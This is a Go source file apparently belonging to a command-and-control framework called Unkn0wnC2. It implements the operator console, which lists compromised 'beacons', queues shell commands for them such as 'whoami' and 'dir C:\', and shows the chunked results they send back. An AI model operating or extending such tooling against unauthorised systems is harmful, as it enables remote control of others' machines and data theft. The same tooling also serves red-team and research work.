// Package main implements the interactive management console for the Unkn0wnC2 server.
// This provides a command-line interface for managing beacons, tasks, and viewing
// results while maintaining clean separation between console input and log output.
package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	// Console display formatting
	beaconListSeparatorLength = 95
	taskListSeparatorLength   = 85
	resultSeparatorLength     = 50

	// Column widths for beacon list
	beaconHostnameWidth = 20
	beaconUsernameWidth = 15
	taskCommandWidth    = 40

	// Time format constants
	timeFormatShort = "15:04:05"
	timeFormatLong  = "2006-01-02 15:04:05"

	// ANSI escape sequences
	ansiClearScreen = "\033[2J\033[H"
	
	// ANSI color codes
	colorReset  = "\033[0m"
	colorRed    = "\033[0;31m"
	colorGreen  = "\033[0;32m"
	colorYellow = "\033[0;33m"
)

// Console state management
var (
	consoleMutex  sync.Mutex
	consoleActive bool
	logCounter    int
)

// ConsoleLogger wraps the standard logger to preserve console input
type ConsoleLogger struct {
	*log.Logger
}

// Printf prints a log message while preserving the console input line
func (cl *ConsoleLogger) Printf(format string, v ...interface{}) {
	if !consoleActive {
		// If console isn't active, use normal logging
		cl.Logger.Printf(format, v...)
		return
	}

	consoleMutex.Lock()
	defer consoleMutex.Unlock()

	logCounter++

	// Colorize the log message
	msg := fmt.Sprintf(format, v...)
	
	// Color [C2] tags green
	msg = strings.Replace(msg, "[C2]", colorGreen+"[C2]"+colorReset, -1)
	
	// Color ERROR messages red
	if strings.Contains(msg, "Error") || strings.Contains(msg, "ERROR") {
		msg = colorRed + msg + colorReset
	}
	
	cl.Logger.Print(msg)
	fmt.Printf("%sc2>%s ", colorGreen, colorReset)
}

// Global console logger instance
var consoleLogger *ConsoleLogger

// initConsoleLogger initializes the console-aware logger
// initConsoleLogger initializes the console logging system with mutex protection
// to prevent log output from interfering with user input.
func initConsoleLogger() {
	consoleLogger = &ConsoleLogger{
		Logger: log.New(os.Stdout, "", log.LstdFlags),
	}
}

// logf is a convenience function for console-aware logging
// logf provides thread-safe formatted logging that preserves the user's input line
// by clearing, logging, and then restoring the current input state.
func logf(format string, v ...interface{}) {
	if consoleLogger != nil {
		consoleLogger.Printf(format, v...)
	} else {
		log.Printf(format, v...)
	}
}

// startC2Console starts an interactive console for C2 management
// startC2Console starts an interactive console for C2 management
// startC2Console launches the interactive C2 management console with command processing
// for beacon management, task distribution, and result retrieval.
func startC2Console() {
	// Initialize console logging
	initConsoleLogger()

	fmt.Printf("\n%s=== UNKN0WN C2 Management Console ===%s\n", colorGreen, colorReset)
	fmt.Println("Type 'help' for available commands")

	consoleActive = true
	defer func() { consoleActive = false }()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Printf("%sc2>%s ", colorGreen, colorReset)

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())

		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := strings.ToLower(parts[0])

		switch command {
		case "help", "?":
			printC2Help()

		case "status", "st":
			c2Manager.PrintStatus()

		case "beacons", "list":
			listBeacons()

		case "tasks":
			listTasks()

		case "task", "cmd":
			if len(parts) < 3 {
				fmt.Println("Usage: task <beacon_id> <command>")
				continue
			}
			beaconID := parts[1]
			command := strings.Join(parts[2:], " ")
			taskID := c2Manager.AddTask(beaconID, command)
			if taskID != "" {
				fmt.Printf("%sTask %s queued for beacon %s%s\n", colorYellow, taskID, beaconID, colorReset)
			} else {
				fmt.Printf("%sFailed to queue task (beacon %s not found)%s\n", colorRed, beaconID, colorReset)
			}

		case "result", "res":
			if len(parts) < 2 {
				fmt.Println("Usage: result <task_id>")
				continue
			}
			taskID := parts[1]
			showTaskResult(taskID)

		case "clear":
			// Clear screen (simple version)
			fmt.Print(ansiClearScreen)
			// Reset log counter since screen is cleared
			consoleMutex.Lock()
			logCounter = 0
			consoleMutex.Unlock()

		case "logs":
			consoleMutex.Lock()
			count := logCounter
			consoleMutex.Unlock()
			fmt.Printf("Total log messages since start/clear: %d\n", count)

		case "exit", "quit":
			fmt.Println("Exiting C2 console...")
			time.Sleep(1 * time.Second)
			os.Exit(0)
			return

		default:
			fmt.Printf("Unknown command: %s (type 'help' for available commands)\n", command)
		}
	}
}

// printC2Help displays the available console commands and their usage information
// for managing the C2 framework operations.
func printC2Help() {
	fmt.Print(`
Available Commands:
  help, ?              - Show this help menu
  status, st           - Show C2 server status
  beacons, list        - List all registered beacons
  tasks                - List all tasks and their status
  task <id> <cmd>      - Queue a command for a specific beacon
  result <task_id>     - Show result of a completed task
  logs                 - Show count of log messages since start/clear
  clear                - Clear screen and reset log counter
  exit, quit           - Exit console

Examples:
  task a1b2 whoami
  task a1b2 dir C:\
  result T1001

Note: Log messages appear between markers while you type.
      Your input is preserved - continue typing after logs appear.

`)
}

// listBeacons displays all registered beacons with their status information
// including hostname, username, operating system, and last check-in time.
func listBeacons() {
	beacons := c2Manager.GetBeacons()

	if len(beacons) == 0 {
		fmt.Println("No beacons registered")
		return
	}

	fmt.Printf("\nRegistered Beacons (%d):\n", len(beacons))
	fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8s %s\n",
		"ID", "Hostname", "User", "OS", "Arch", "Queue", "Last Seen")
	fmt.Println(strings.Repeat("-", beaconListSeparatorLength))

	for _, beacon := range beacons {
		fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8d %s\n",
			beacon.ID,
			truncateString(beacon.Hostname, beaconHostnameWidth),
			truncateString(beacon.Username, beaconUsernameWidth),
			beacon.OS,
			beacon.Arch,
			len(beacon.TaskQueue),
			beacon.LastSeen.Format(timeFormatShort))
	}
	fmt.Println()
}

// listTasks displays all queued and completed tasks with their current status
// and execution details for monitoring C2 operations.
func listTasks() {
	tasks := c2Manager.GetTasks()

	if len(tasks) == 0 {
		fmt.Println("No tasks found")
		return
	}

	fmt.Printf("\nTasks (%d):\n", len(tasks))
	fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
		"Task ID", "Beacon", "Status", "Command", "Created")
	fmt.Println(strings.Repeat("-", taskListSeparatorLength))

	// Get expected results for progress tracking
	expectedResults := c2Manager.GetExpectedResults()

	for _, task := range tasks {
		statusDisplay := task.Status

		// Show progress for tasks receiving chunked results
		if task.Status == "sent" {
			if expected, exists := expectedResults[task.ID]; exists {
				receivedCount := 0
				for i := 0; i < expected.TotalChunks; i++ {
					if expected.ReceivedData[i] != "" {
						receivedCount++
					}
				}
				percentage := float64(receivedCount) / float64(expected.TotalChunks) * 100
				statusDisplay = fmt.Sprintf("receiving (%d%%)", int(percentage))
			}
		}

		fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
			task.ID,
			task.BeaconID,
			statusDisplay,
			truncateString(task.Command, taskCommandWidth),
			task.CreatedAt.Format(timeFormatShort))
	}
	fmt.Println()
}

// showTaskResult displays the complete output from a completed task
// including formatted result data and execution metadata.
func showTaskResult(taskID string) {
	tasks := c2Manager.GetTasks()
	task, exists := tasks[taskID]

	if !exists {
		fmt.Printf("%sTask %s not found%s\n", colorRed, taskID, colorReset)
		return
	}

	fmt.Printf("\nTask %s Details:\n", taskID)
	fmt.Printf("  Beacon ID: %s\n", task.BeaconID)
	fmt.Printf("  Command:   %s\n", task.Command)
	fmt.Printf("  Status:    %s\n", task.Status)
	fmt.Printf("  Created:   %s\n", task.CreatedAt.Format(timeFormatLong))

	if task.SentAt != nil {
		fmt.Printf("  Sent:      %s\n", task.SentAt.Format(timeFormatLong))
	}

	if task.Result != "" {
		fmt.Printf("  Result (%d chars):\n", len(task.Result))
		fmt.Println(strings.Repeat("-", resultSeparatorLength))
		fmt.Println(task.Result)
		fmt.Println(strings.Repeat("-", resultSeparatorLength))
	} else {
		// Check if we're still receiving chunks
		expectedResults := c2Manager.GetExpectedResults()
		if expected, exists := expectedResults[taskID]; exists {
			receivedCount := 0
			for i := 0; i < expected.TotalChunks; i++ {
				if expected.ReceivedData[i] != "" {
					receivedCount++
				}
			}
			percentage := float64(receivedCount) / float64(expected.TotalChunks) * 100
			fmt.Printf("  Result: Receiving... %.0f%% (%d/%d chunks)\n", percentage, receivedCount, expected.TotalChunks)
		} else {
			fmt.Println("  Result: (no result yet)")
		}
	}
	fmt.Println()
}

// truncateString shortens a string to the specified maximum length,
// adding "..." to indicate truncation if the original was longer.
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}
